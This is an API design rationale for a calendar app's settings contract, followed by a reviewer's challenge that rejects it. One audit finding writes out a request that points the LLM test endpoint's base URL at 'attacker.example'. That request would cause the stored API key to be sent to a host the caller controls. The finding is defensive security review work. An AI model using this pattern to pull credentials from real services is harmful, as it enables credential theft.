---

## 1. What this contract is for

The spec's problem in one line: every signed-in account reads and writes one
shared settings row, that row returns the language-model provider key in clear
text, and the write is a full replace that persists every omitted property as a
zero value.

The interface has to change in three ways that are not independent:

1. **Scope.** Eight operations stop describing a singleton and start describing
   the caller. Seven of them change no shape at all — only whose data they are
   about — which is why most of this diff is description rather than schema.
2. **Projection.** `llmApiKey` stops leaving the server, and a boolean takes its
   place so that "configured" and "not configured" remain distinguishable.
3. **Write semantics.** The write becomes a merge, because once the key is
   write-only a client can no longer hold a complete representation, and a
   replace against an incomplete representation is a data-loss machine.

Everything else in the diff — the enums, the tightened patterns, the new 400s —
is the touch-it-fix-it rule (factory README §7) applied to the findings and
`x-uncertain` markers already sitting on these operations.

## 2. The decision that shaped everything: `llmApiKey` is `writeOnly`

The spec requires that the key never appear in a response and that a reader can
still tell whether one is on file. Three shapes could express that.

**Rejected: return a masked value** (`sk-…f3a1`, or a fixed `********`). It reads
well and it is what a lot of APIs do, and it is wrong here for two reasons. A
mask is still a disclosure — the last four characters of an API key are enough to
confirm *which* key it is, which is exactly what a colleague comparing against a
key they already hold wants to know. And a mask has to round-trip: a client that
submits the document back sends the mask, and the server has to recognise it and
not store it. That is a sentinel value in the write path, and sentinel values get
stored the first time someone refactors the comparison.

**Rejected: split into two schemas**, `Settings` (response, no key) and
`SettingsUpdate` (request, with key). This is the textbook answer and it is
cleaner as a document. It was rejected because of what it does to the client: the
shipped frontend reads the settings document and submits it back, and under two
disjoint schemas the document it holds is not a member of the type it must send.
Every consumer then needs a translation step whose only job is to delete
properties, and `additionalProperties: false` on the request means forgetting one
is a 400. The asymmetry is real but it is two properties out of fifty, and
OpenAPI has a keyword for exactly this.

**Chosen: one schema, `writeOnly` on the key and `readOnly` on the indicator.**
`SettingsFields` stays the single source of property definitions.
`llmApiKey: {writeOnly: true}` means it is accepted in a request and is not part
of any response. `llmApiKeySet: {readOnly: true}` and `updatedAt: {readOnly: true}`
mean the reverse, and — this is the part that earns the choice — OpenAPI defines
`readOnly` as *may be sent in a request and SHOULD be ignored*, which is exactly
the behaviour a round-tripping client needs. `Settings` requires
`llmApiKeySet` where it used to require `llmApiKey`; `SettingsUpdate` requires
nothing.

The cost is that code generators vary in how faithfully they honour
`readOnly`/`writeOnly`, and neither generator has been run against this bundle
yet. If `oapi-codegen` or `openapi-typescript` produces a type that carries
`llmApiKey` on the response side, that is a generator behaviour to check at stage
4, and the fallback is the rejected two-schema split. Flagged in §8.

**What the semantics buy.** Because the write is a merge (§3), the key needs no
special case at all:

| request | stored key afterwards |
|---|---|
| `llmApiKey` absent | unchanged |
| `"llmApiKey": "sk-new"` | `sk-new` |
| `"llmApiKey": ""` | cleared |
| `"llmApiKey": null` | 400, nothing stored |

That table is the general rule, not an exception to it. A special case for the
one property everybody forgets is how the key would come back.

## 3. PUT, PATCH, and why both exist

**The argument the issue asks for: should PUT become PATCH?** Yes, and the
reason is not style.

`PUT` means "make the resource's state equal to the enclosed representation".
A client can only satisfy that if it can obtain the current representation. After
§2 it cannot: `llmApiKey` is write-only, so the document a client can hold is
strictly smaller than the resource. **A resource whose representation is not
retrievable cannot support PUT** — any PUT is either a lie about completeness or
a merge wearing PUT's name. That settles the method question on its own, before
anyone argues about whether merging is convenient.

The alternative — keep PUT as a true replace and require the client to send
everything — was considered and fails on the same point. It would mean either
that omitting the key wipes it (which is API-004, the defect we are fixing, kept
alive for one property) or that the key is exempt from the replace (which is a
merge for one property, i.e. the lie again, in a smaller box).

**So why is PUT still in the contract?** Because of the factory's fixed
cross-repo ordering (README §1): the backend contract merges, types regenerate,
then the frontend implements. There is a window in which a frontend that only
knows `PUT /api/settings` is talking to the new server. If PUT 405s, saving
settings is broken for the length of that window. `PUT` is therefore retained as
a `deprecated: true` alias with semantics identical to PATCH, with a follow-up
issue recorded in the manifest (`followUps.retirePutSettings`) to remove it.

This is a deliberate, time-boxed contradiction and the contract says so in the
operation's own description rather than hiding it. Two things make it
acceptable: it is marked deprecated, so a generator and a reader both see it; and
it is *identical* to PATCH rather than subtly different, so there is one
behaviour to test and one to reason about.

**If the two repositories deploy together** — spec §8 OQ-3, unanswered — the
alias is unnecessary and should be dropped before this merges. That is the one
open question that changes this part of the contract, and the challenger should
press on it.

**Merge semantics, stated once and totally.** The rule needs no knowledge of what
is stored, which is what makes it testable:

| in the request body | effect |
|---|---|
| property absent | unchanged |
| property present, any value of its type | set to exactly that value — `""`, `0` and `false` are values |
| property present, `null` | 400; nothing is stored |
| `workingHours` / `lunchBreaks` present | replaced whole; a weekday omitted from the supplied map is removed |
| `llmApiKeySet` / `updatedAt` present | accepted, ignored |
| unknown property | 400 (`additionalProperties: false`) |

Two of these were choices rather than deductions.

**`null` is a 400, not "unchanged" and not "clear".** RFC 7396 merge-patch says
null deletes; a lot of hand-rolled Go patches say null means unchanged, because
that is what a nil pointer does — and `DailyRecapPatch` is exactly that today. I
took neither. Under merge-patch, a client whose serialiser emits `null` for an
uninitialised field silently deletes data; under nil-pointer semantics, the same
client silently does nothing and reports success. Both are silent. Refusing null
is the only option where the client finds out. This does mean the contract is
**not** `application/merge-patch+json`, and it deliberately does not claim to be:
the media type is `application/json` and the rules are written out.

**Objects replace, they do not deep-merge.** `workingHours.days` is a map keyed
by weekday. Under a deep merge there is no way to express "I no longer work
Tuesdays" — you can add a day and change a day, and removing one requires a
sentinel, which is §2's rejected mask problem again. Replacing the whole object
makes removal ordinary at the cost of making the client send the whole group,
which it already has.

## 4. Scope changes that are not shape changes

Seven operations change whose data they describe and nothing else:
`getSettings`, `getDailyRecapSettings`, `patchDailyRecapSettings`,
`previewDailyRecap`, `sendDailyRecapTest`, `testLLMConnection`, `getAuthStatus`.

The contract records this in prose because there is nothing structural to record
— and per factory README §7, it also records *what the server did before*, with
the finding id, so the document does not quietly pretend the old behaviour never
existed. `getAuthStatus` lives in `auth.yaml` and was edited there; its response
schema is untouched.

One scope change has no operation at all and is therefore invisible in this
contract: the daily-recap cron. `RunAll` joins `settings st ON st.id = 1` with no
correlation to the user (`backend/engine/daily_recap.go:124-127`), so one user
enabling the recap sends one to everybody. It is in the spec (AC-4) and the plan
and cannot be expressed here. The challenger should not read its absence as an
omission.

## 5. The `x-uncertain` markers, and how each was settled

The factory's rule is that resolving a marker means *determining the answer*, not
deleting the marker. Three sat on these operations.

**U-18 — `SettingsFields.calendarProvider`, the accepted set.** Settled by
reading the three consumers that switch on the value:
`backend/calendar/client_factory.go:16,22,27`,
`backend/api/handlers_auth.go:97,105,111`,
`backend/engine/freebusy_service.go:122`. All three accept exactly `outlook` and
`webcal` and treat every other value as Google, including a typo. The enum is
therefore `[google, outlook, webcal]` and the server now enforces it. The same
reasoning applied to `conferencingProvider` (`meet` / `zoom` / `teams`), which
carried no marker but had the identical defect.

**U-19 — `SettingsFields.recapSendTime`, the rendered format.** The marker asked
for a live response to be observed, which this session could not do. It is
settled a different way: by removing the question. The column is Postgres `TIME`
(`015_daily_recap.up.sql:3`) read as `recap_send_time::TEXT`
(`backend/storage/settings.go:224`), which renders `HH:MM:SS`, while the write
path and the struct comment both say `HH:MM` — so **no client could round-trip
this value**, which is a defect regardless of which format the marker turns out to
name. The contract pins `HH:MM` in both directions and the server renders the
column to that. Spec AC-16 is the integration test that proves it, and it is
written as a test rather than as an assertion precisely because I could not reach
a database.

**U-20 — `SlackBlock`.** Settled by reading `engine/daily_recap.go` end to end
(`BuildMessage` `:150-236`, `buildSummaryBlock` `:238-262`, `buildMeetingBlocks`).
The complete set of top-level block `type` values is
`header | context | section | divider`; the only nested text object types are
`plain_text` and `mrkdwn`. The contract adds the `type` enum and **keeps**
`additionalProperties: true`. That is deliberate: the member set varies by block
type, the Go type is a bare `map[string]interface{}`, and pinning the members
would assert more than the code supports. The enum is the part that was
determinable and the part a client switches on.

## 6. Making the wrong request impossible rather than documenting its rejection

Per the contract-author rules, everything that could move from prose into schema
did:

| Was | Is | Closes |
|---|---|---|
| `calendarProvider: string`, "not validated" | `enum: [google, outlook, webcal]` | U-18 |
| `conferencingProvider: string`, prose about the three values | `enum: [meet, zoom, teams]` | — |
| `bufferMinMeetingMinutes`, "not range-validated" | `minimum: 0` | API-082 |
| `recapSendTime: string`, format unknown | `pattern` `HH:MM` | U-19 |
| `recapSendTo` enum, enforced on one path only | enum, enforced on both | API-081 |
| `workStart`/`workEnd`/`lunchStart`/`lunchEnd` `^[0-9]{2}:[0-9]{2}$` | `^([01][0-9]\|2[0-3]):[0-5][0-9]$` | API-082 |
| `DaySchedule.start`/`end` same loose pattern | `^(([01][0-9]\|2[0-3]):[0-5][0-9])?$` | see below |
| `DailyRecapPatch` all-`nullable`, `additionalProperties: true` | no nullable, `additionalProperties: false` | §3 |
| `LLMTestResult.provider: string` | enum | — |

`DaySchedule`'s pattern was wrong in both directions at once: `^[0-9]{2}:[0-9]{2}$`
admitted `99:99`, which the server rejects via `time.Parse`, and forbade the
empty string, which the server accepts and which GET returns for a disabled day.
The contract described neither the requests the server takes nor the responses it
sends.

Four rules could **not** move into schema because they are cross-property and
OpenAPI cannot express them: `workEnd > workStart`, `lunchEnd > lunchStart`,
`focusMinBlockMinutes <= focusMaxBlockMinutes`, and the `timezone` being
resolvable by `time.LoadLocation`. Each is documented on the property and each
has a named 400 message in the shared `SettingsValidationError` response.
`dependentSchemas` and `if`/`then` could express the first three in JSON Schema
2020-12, and were rejected: neither code generator in use handles them, so the
constraint would be in the document and in neither generated artefact, which is
the worst of both.

## 7. What this contract deliberately does not change

- **The response shape of `getAuthStatus`.** API-009 is about whose data it
  returns. Changing the shape as well would make the diff impossible to review
  against the finding.
- **`testLLMConnection`'s 502 body.** It still echoes the provider's error text
  (API-054 / T8). The contract adds only the narrower guarantee that neither the
  submitted nor the stored key appears (spec AC-14). Batch A2 owns the rest, and
  this contract says so on the operation rather than silently improving it.
- **The casing.** The contract stays camelCase throughout, because that is what
  the server emits and what the bundle already documents. API-013 is the
  frontend's snake_case adapter disagreeing with it, and it is resolved by fixing
  the adapter against generated types, not by changing the wire format. Changing
  the wire format would break the MCP consumer for no benefit.
- **`microsoft_tokens` and `zoom_tokens`.** Still `json:"-"`, still absent from
  the contract. They move with the row; they do not appear on the wire before or
  after.

## 8. What a challenger should attack

Written out rather than left for the challenger to find, because the factory's
gate is "name a specific request you tried to break":

1. **`readOnly`/`writeOnly` fidelity.** Neither generator has been run against
   this bundle. If `oapi-codegen` emits `LlmApiKey` on the response struct, the
   handler can leak it by accident and the contract will not have prevented it.
   The two-schema split (§2) is the fallback. **This is the single most likely
   place this contract is wrong.**
2. **The request `POST /api/settings` with `{"llmApiKeySet": false}`.** Under the
   contract it succeeds and does nothing. Is that the least surprising outcome,
   or should it be a 400? I chose "ignored" because round-tripping requires it,
   but a client that thinks it is clearing the key gets silent success — the
   exact failure mode §3 refuses for `null`.
3. **`PATCH /api/settings` with `{}`.** A valid no-op returning 200 and a full
   document. Defensible, but it means a client with a bug that sends an empty
   body gets a success and a document, and may conclude it saved.
4. **`additionalProperties: false` on `SettingsUpdate` versus the shipped
   frontend.** The current frontend body carries snake_case properties
   (`work_start`, `llm_api_key`, …) alongside the camelCase ones it spread from
   the response. Those are now a 400. So the deprecated PUT alias keeps the READ
   path alive but **does not** keep the frontend's writes alive. Is that
   acceptable, or should `SettingsUpdate` tolerate unknown properties for one
   release? I argue not — today those writes are silently discarded, so a 400 is
   strictly more honest — but this is a real user-visible regression in the
   window and a reviewer may weigh it differently.
5. **`DailyRecapPatch` losing `nullable`.** Any client sending
   `{"channel_id": null}` gets a 400 where it used to get a 204. I found no such
   client — there is no frontend consumer of the daily-recap routes at all — but
   absence of a consumer in two repositories is not absence of a consumer.
6. **The deprecated PUT's continued existence.** If spec OQ-3 comes back "the
   repos deploy together", this operation should not merge at all.

## Challenge — 2026-09-17

*contract-challenger. I did not write this contract and did not ask the author
for their reasoning. Payloads below were constructed against the fragments and
checked against the handlers and the frontend consumer. The assembler was run;
nothing else can run here (Go and npm registries return 403).*

**Verdict**: reject

Three findings block, and the first two are not stylistic: C1 makes the response
schema unsatisfiable by data this feature exists to repair, and C2 introduces a
retrieval channel for the very key the contract declares unreadable. C3 removes
an operation whose stated justification is untrue. Everything else I attacked —
and there is a lot of it — held, and §"Verified clean" says what not to re-check.

### Requests wrongly permitted

1. **`POST /api/llm/test` with `{"llmProvider": "openai", "llmBaseUrl": "https://attacker.example"}`**
   — permitted because every `LLMTestRequest` property is optional, `llmBaseUrl`
   is an unconstrained `string`, and the schema's own description makes a missing
   property "fall back to the CALLER'S stored value". So the request supplies the
   destination and the server supplies the credential.
   `nlp.NewLLMClientFromSettings` builds
   `OpenAIClient{APIKey: s.LLMAPIKey, Model: model, BaseURL: s.LLMBaseURL}`
   (`backend/nlp/llm_factory.go:29`), and `OpenAIClient.Complete` POSTs to
   `base + "/v1/chat/completions"` with header
   `Authorization: Bearer <key>` (`backend/nlp/parser.go:31,43`). The stored key
   leaves the deployment to a caller-chosen host, and the 200/502 confirms
   delivery. `ollamaBaseUrl`, `azureEndpoint`, `gcpProject`/`gcpLocation` and
   `awsProfile` give the same shape.
   This is not a pre-existing defect that the contract inherits: today the
   handler never reads `r.Body` at all (`backend/api/handlers_llm.go:16-21`), so
   the channel does not exist. **The contract creates it**, on the same document
   that says of `llmApiKey` "There is no way to read it back, by design" and
   whose AC-11 requires that no value in any response equals the stored key. A
   caller does not need it in a response; they need it at a host they control.
   **Fix (schema shape only)**: make the probe all-or-nothing rather than a
   per-property overlay — `LLMTestRequest` becomes
   `oneOf: [ {maxProperties: 0}, {required: [llmProvider, llmApiKey], ...} ]`,
   so a body that supplies any endpoint must also supply the credential it is to
   be used with, and the stored key is only ever sent to the stored endpoint.
   Whatever form is chosen, the invariant the contract must state is: *a stored
   credential is never paired with a submitted destination.*

2. **`PATCH /api/settings` with
   `{"workingHours": {"mode":"by_day","default":{"enabled":true,"start":"09:00","end":"18:00"},"days":{"Monday":{"enabled":true,"start":"08:00","end":"17:00"}}}}`**
   — permitted because `WorkingHoursSchedule.days` is
   `additionalProperties: {$ref: DaySchedule}` with no key constraint. The server
   accepts it too: `validateSchedulePreferences` tests
   `validScheduleWeekdays[strings.ToLower(day)]`
   (`backend/api/handlers_settings.go:145`, and `:153` for `LunchBreaks`), so
   `"Monday"` validates and is stored — but the read side looks the day up as
   `Days[strings.ToLower(day.Weekday().String())]`
   (`backend/storage/settings.go:117`, and `:138` for lunch), so the entry can
   never match and the user's Monday hours are silently inert forever.
   The contract *documents* this in the `days` description instead of preventing
   it, which contradicts the rationale doc's own §6, "Making the wrong request
   impossible rather than documenting its rejection". Under merge it is worse
   than before, because `workingHours` is replaced whole: the write that installs
   the dead key also deletes the working key it replaced.
   **Fix**: `propertyNames: {enum: [monday, tuesday, wednesday, thursday, friday,
   saturday, sunday]}` on `WorkingHoursSchedule.days` and on
   `LunchBreakSchedule`.

3. **`PATCH /api/settings` with `{"workingHours": {"mode": "", "default": {"enabled": false, "start": "", "end": ""}, "days": {}}}`**
   — *rejected* by the contract (`mode` enum is `[all_days, by_day]`) and
   *accepted* by the server (`handlers_settings.go:129`,
   `mode != "" && mode != "all_days" && mode != "by_day"`). The contract says so
   itself two lines below the enum: "`\"\"` is accepted on write only when `days`
   is empty". A schema and its own description disagree inside one block.
   Narrowing here may well be right, but then it is a new 400 and belongs in
   `SettingsValidationError`'s catalogue and in AC-17, and spec §6's promise that
   both tests in `handlers_settings_schedule_test.go` "must keep passing
   unchanged" has to be re-checked against it.
   **Fix**: add `''` to the enum and keep the documented conditional rule as a
   handler check, or drop the description sentence, add the message to
   `SettingsValidationError`, and say in §6 that the validator behaviour changes.

### Responses the client cannot handle

1. **`getSettings` may return `"lunchStart": ""` (or `workStart`, `workEnd`,
   `lunchEnd`, `recapSendTime`) — and the contract forbids it.** The five
   properties carry `pattern: '^([01][0-9]|2[0-3]):[0-5][0-9]$'`, which does not
   match the empty string. The server stores empty strings in exactly those
   columns: `validateSettings` skips the format check when the value is empty
   (`backend/api/handlers_settings.go:75`, `if val != "" && !timePattern...`),
   and `getLunchWindow` treats an empty `lunchStart` as a meaningful state
   (`backend/storage/settings.go:140-142`). Worse, **every row damaged by API-004
   already has them**: today's full-replace PUT persists each omitted property as
   its Go zero value, which for these five is `""`. So on the first day this
   ships, `GET /api/settings` for any user whose row was zeroed by the defect
   this feature exists to fix returns a body that fails the contract it was
   generated from — and the generated zod schema rejects it in the client before
   any UI sees it.
   This is also what makes **spec AC-7 unsatisfiable**: `{"lunchStart": ""}` is
   the documented way to clear the legacy lunch window, and the schema 400s it.
   `recapSendTime` contradicts itself in its own description — "Empty on write ->
   `08:00` is substituted" under a pattern that rejects empty.
   **Fix**: `pattern: '^(([01][0-9]|2[0-3]):[0-5][0-9])?$'` on all five — the
   exact correction the author already made, and justified, for
   `DaySchedule.start`/`end`. If instead empty is to be refused, the change needs
   a migration that repairs existing empty values, a new message in
   `SettingsValidationError`, and an AC-7 amendment.

2. **`getSettings` may return
   `"workingHours": {"mode":"all_days","default":{"enabled":false,"start":"","end":""},"days":{}}`**
   — valid under the PAC-24-widened `DaySchedule` pattern, and the shape the
   server produces for a user who has never configured a working day (Go
   serialises the zero `DaySchedule` with no omitempty). The consumer cannot
   render it: `normalizeInterval`
   (`smart-calendar-flow/src/api/client.ts:481-488`) tests `start`/`end` with
   `isValidHHMM` (`:477-479`), which rejects `""`, and returns `undefined`;
   `normalizeWorkingHours` (`:505-517`) then returns `undefined` because
   `default` is undefined and `days` is empty; `normalizeSettings` reaches
   `delete out.working_hours` (`:543`). The per-day working-hours section
   disappears from the settings page with no error and no empty state — the
   silent blank AC-20 exists to end, reproduced by a response the contract
   blesses.
   **Fix**: this is a consumer defect, not a schema one, so the contract's exit
   is to state the case explicitly in `WorkingHoursSchedule.description` (an
   all-empty `default` with an empty `days` is a valid, meaningful "unconfigured"
   document) so the frontend stage cannot miss it, and to add it to AC-20's
   fixture list.

### Consumers affected

- `smart-calendar-flow/src/api/client.ts:1141-1143` — `llmTest: (s: Settings) =>
  requestApi("POST", "/llm/test", s)` posts the raw snake_case `Settings` object,
  not `settingsRequestBody(s)`. With `LLMTestRequest.additionalProperties: false`
  every property is unknown, so the probe 400s from the moment the backend
  merges. Correctly predicted in the manifest.
- `smart-calendar-flow/src/api/client.ts:550-563`, `src/pages/Settings.tsx` — the
  write path, via `additionalProperties: false`. Judged below.
- `mcp/tools.go:236` (`clockwise_get_settings`), `:243`
  (`clockwise_calendar_status`) — pass-through (`mcp/client.go:22`), no change
  needed. The manifest is right. **Note for C3**: `mcp/client.go` defines
  `get`, `post`, `patch` and `delete` and **no `put` at all** (`:22,43,47,51`),

### Contract/implementation divergences

1. Contract: `workStart`/`workEnd`/`lunchStart`/`lunchEnd`/`recapSendTime` must
   match `HH:MM`. Handler: empty is accepted and stored
   (`backend/api/handlers_settings.go:75`). See Responses 1.
2. Contract: `WorkingHoursSchedule.mode` enum `[all_days, by_day]`. Handler:
   `""` accepted (`backend/api/handlers_settings.go:129`). See Requests 3.
3. **`PUT /api/settings`'s description states something that is not true.** It
   says the operation "exists only so that a frontend deployed before this
   contract merged keeps saving settings during the window". It cannot: PUT and
   PATCH share `SettingsUpdate`, which is `additionalProperties: false`, so the
   shipped frontend's snake_case body is a 400 on PUT exactly as on PATCH. The
   rationale doc concedes this in §8.4 — "the deprecated PUT alias keeps the READ
   path alive but **does not** keep the frontend's writes alive" — so the
   operation description and the document explaining it contradict each other,
   and a reader of the bundle (which is what gets generated from) sees only the
   false one. With no MCP consumer and no e2e consumer either, the alias buys
   nothing and costs a permanently deprecated operation, a second entry in
   `MIGRATION.md`, and a follow-up issue to remove it.
   On the question as posed — is a deprecated PUT with merge semantics
   defensible? No. A PUT whose omissions mean "unchanged" is not a replace, and a
   `deprecated: true` flag documents an intention to remove, not a change of
   method semantics; generated clients and any intermediary that reasons about
   idempotency read the method, not the flag. It is a PUT that lies, and it lies
   for a compatibility window it does not actually cover.
   **Fix**: delete `updateSettings`. If OQ-3 returns "the repos deploy weeks
   apart" and a shim is genuinely wanted, it must be a shim that works — a
   distinct body schema that tolerates the shipped snake_case names and maps
   them — and its description must say that is what it is.

### Judgement on `additionalProperties: false` (asked for explicitly)

**Acceptable, not blocking — but only once C3 is fixed.** Three reasons. Nothing
that works today stops working: the 26 snake_case properties are already
discarded by `encoding/json`, so the writes the 400 refuses are writes that
currently have no effect. The alternative — tolerating unknown properties "for
one release" — removes the only mechanism that makes API-013 detectable rather
than silent, and "for one release" has no forcing function; it becomes the
permanent shape. And the blast radius is one page's write path in the repo that
the factory's fixed ordering schedules next anyway. What is *not* acceptable is
shipping it while an operation in the same bundle claims to shield the frontend
from it. Fix C3 and this stands as the author argues it.
